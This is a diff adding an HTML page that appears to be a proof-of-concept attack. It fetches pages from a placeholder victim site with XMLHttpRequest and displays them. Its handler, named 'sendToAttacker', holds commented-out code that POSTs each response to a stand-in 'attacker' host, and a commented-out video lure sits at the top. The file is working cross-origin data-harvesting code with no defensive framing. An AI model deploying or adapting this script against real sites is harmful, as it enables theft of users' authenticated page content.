@@ -1,0 +1,42 @@
+<!--
+<h1>See this video</h1>
+<iframe src="http://youtu.be/...."></iframe>
+-->
+URL: <input id=url size=50 />
+<button onclick="getUrl(document.getElementById('url').value)">Get</button>
+<br />
+<script>
+var urls = ['http://victim.example.org/page1', 'http://victim.example.org/page2'];
+
+function getUrl(url) {
+  var xhr;
+  xhr = new XMLHttpRequest();
+  xhr._url = url;
+  xhr.open("GET", url, true);
+  xhr.onreadystatechange = sendToAttacker;
+  xhr.send( null );
+}
+
+for (var i = 0; i < urls.length; i++) {
+  getUrl(urls[i]);
+}
+
+function sendToAttacker(event) {
+  var xhr = event.target;
+  try {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        /*
+        var attacker_xhr = new XMLHttpRequest();
+        attacker_xhr.open("POST", "http://attacker/scrap-results?url=" + encodeURIComponent(xhr._url));
+        attacker_xhr.send(httpRequest.responseText);
+        */
+        document.getElementById('output').value = xhr._url + "\n\n" + xhr.responseText;
+      }
+    }
+  }
+  catch( e ) {}
+}
+</script>
+<textarea cols=70 rows=40 id=output>
+</textarea>
